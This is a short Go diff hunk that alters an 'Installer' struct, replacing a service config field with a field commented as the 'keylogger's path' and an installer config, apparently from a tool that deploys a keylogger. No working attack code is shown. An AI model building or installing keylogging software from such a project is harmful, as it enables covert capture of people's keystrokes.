@@ -9,5 +9,6 @@ import (
 type Installer struct {
 	lc           string             // logging category
 	registryInst *registry.Registry // instance of Registry
-	cfg          config.Cfg         // service's config
+	klPath       string             // keylogger's path
+	cfgInstaller config.Installer   // Installer's config
 }
